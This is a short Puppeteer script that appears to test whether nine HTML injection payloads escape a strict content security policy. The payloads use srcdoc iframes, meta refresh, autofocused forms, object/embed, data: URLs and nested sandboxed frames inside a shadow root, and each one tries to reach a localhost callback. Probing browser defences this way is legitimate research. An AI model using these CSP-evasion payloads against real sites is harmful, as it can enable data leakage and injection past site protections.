const puppeteer = require("puppeteer");

const CHROME = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
const callback = "http://127.0.0.1:8000/srcdoc-hit";
const bodies = [
  `<iframe srcdoc="<meta http-equiv='refresh' content='0;url=${callback}?a=1'>"></iframe>`,
  `<iframe srcdoc="<form action='${callback}?a=2'><input autofocus></form>"></iframe>`,
  `<object data="${callback}?a=3"></object>`,
  `<embed src="${callback}?a=4">`,
  `<iframe sandbox="allow-scripts" srcdoc="<script>location='${callback}?a=5'<\/script>"></iframe>`,
  `<iframe credentialless srcdoc="<script>location='${callback}?a=6'<\/script>"></iframe>`,
  `<iframe src="data:text/html,<script>location='${callback}?a=7'<\/script>"></iframe>`,
  `<object data="data:text/html,<script>location='${callback}?a=8'<\/script>"></object>`,
  `<iframe srcdoc="<iframe sandbox='allow-scripts' srcdoc=\"<script>location='${callback}?a=9'<\\/script>\"></iframe>"></iframe>`,
];

(async () => {
  const browser = await puppeteer.launch({ executablePath: CHROME, headless: "new" });
  for (const [index, body] of bodies.entries()) {
    const page = await browser.newPage();
    const requests = [];
    page.on("request", request => requests.push(request.url()));
    const source = `<!doctype html><html><head><meta http-equiv="content-security-policy" content="default-src 'none'"></head><body><div><template shadowrootmode="open">${body}</template></div></body></html>`;
    await page.setContent(source, { waitUntil: "domcontentloaded" });
    await new Promise(resolve => setTimeout(resolve, 1500));
    console.log(JSON.stringify({ index, frames: page.frames().map(frame => frame.url()), requests }));
    await page.close();
  }
  await browser.close();
})();
